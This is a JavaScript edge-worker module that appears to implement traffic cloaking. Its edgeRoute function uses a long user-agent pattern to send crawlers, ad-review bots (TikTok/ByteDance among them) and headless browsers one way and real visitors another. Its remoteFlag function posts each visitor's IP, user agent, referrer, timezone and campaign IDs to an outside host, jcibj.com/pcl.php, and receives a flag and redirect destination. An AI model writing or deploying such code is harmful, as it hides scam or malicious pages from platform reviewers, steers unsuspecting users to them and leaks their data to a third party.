function pad(n) {
  return String(n).padStart(2, "0");
}

export function utcStamp() {
  const d = new Date();
  return (
    d.getUTCFullYear() +
    "-" +
    pad(d.getUTCMonth() + 1) +
    "-" +
    pad(d.getUTCDate()) +
    " " +
    pad(d.getUTCHours()) +
    ":" +
    pad(d.getUTCMinutes()) +
    ":" +
    pad(d.getUTCSeconds())
  );
}

export function edgeRoute(ua) {
  const botLike =
    !ua ||
    /(bot|spider|crawl|slurp|facebookexternalhit|facebot|twitterbot|linkedinbot|pinterest|embedly|quora|whatsapp|telegrambot|applebot|bingpreview|yandex|semrush|ahrefs|petalbot|adsbot|google-inspection|headless|phantom|selenium|puppeteer|tiktok|musical_ly|bytedance|bytespider|ttwebview|aweme)/i.test(
      ua
    );
  return botLike ? "main" : "alt";
}

/** Call remote decision API. Returns { ok, flag, dest, parts }. */
export async function remoteFlag(request, env, payload) {
  const checkId = (env && (env.CHECK_ID || env.CHECK_CAMPAIGN_ID)) || "";
  const checkUser = (env && (env.CHECK_USER_ID || env.CHECK_UID)) || "";
  const upstream =
    (env && env.CHECK_UPSTREAM) || "https://jcibj.com/pcl.php";
  if (!checkId || !checkUser) return { ok: false, reason: "no-creds" };

  const ua = request.headers.get("user-agent") || "";
  const ip =
    request.headers.get("cf-connecting-ip") ||
    (request.headers.get("x-forwarded-for") || "").split(",")[0].trim() ||
    "";
  const ipr = request.headers.get("x-forwarded-for") || ip;
  const host = request.headers.get("host") || payload.sn || "";

  const body = new URLSearchParams({
    date: utcStamp(),
    lan: request.headers.get("accept-language") || "",
    ref: payload.r || request.headers.get("referer") || "",
    ip,
    ipr,
    sn: payload.sn || host,
    requestUri: payload.rui || "",
    query: payload.qu || "",
    ua,
    co: payload.co || "",
    tz: payload.tz || "",
    he: payload.he || "",
    user_id: checkUser,
    id: checkId,
  }).toString();

  const res = await fetch(upstream, {
    method: "POST",
    headers: {
      "content-type": "application/x-www-form-urlencoded",
      "user-agent": ua || "Mozilla/5.0",
      accept: "*/*",
    },
    body,
  });
  const text = (await res.text()).trim();
  const parts = text.split(",");
  const flag = (parts[0] || "").trim().toLowerCase();
  const dest = (parts[1] || "").trim();
  return { ok: true, flag, dest, raw: text, parts };
}
